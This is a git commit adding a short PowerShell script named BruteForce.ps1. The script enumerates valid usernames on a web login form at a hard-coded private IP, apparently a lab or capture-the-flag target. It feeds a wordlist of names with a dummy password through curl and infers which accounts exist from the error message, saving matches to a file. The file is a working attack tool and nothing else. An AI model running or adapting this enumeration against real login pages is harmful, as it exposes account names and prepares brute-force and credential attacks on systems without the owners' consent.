aef5c07d4d29c5e5c9059c9008321d40ff15be57
Conde <79221088+conde26@users.noreply.github.com>
2022-05-16 22:03:01 +0200

    Create BruteForce.ps1

---
+++ BruteForce.ps1
@@ -0,0 +1,28 @@
+#!/opt/microsoft/powershell/7/pwsh
+#Autor: Conde
+
+param(
+        [Parameter(Position=0,mandatory=$true)]
+        [string]$w
+)
+
+#Variables
+$url="http://10.10.11.160:5000/login"
+$result="ValidUsers.txt"
+
+#Test File
+if([System.IO.File]::Exists($result)){
+        Remove-Item $result
+}
+
+#Main
+Write-Host -Foreground blue "`n[*] Finding Valid Users `n"
+gc $w | % {
+
+        $estado=$(curl -s $url --data "username=$_&password=test" | Select-String -pattern "Invalid login")
+
+        if ($estado){
+                write-host -Foreground green "`t[✔] User found: $_"
+                $_ | out-file $result
+        }
+}
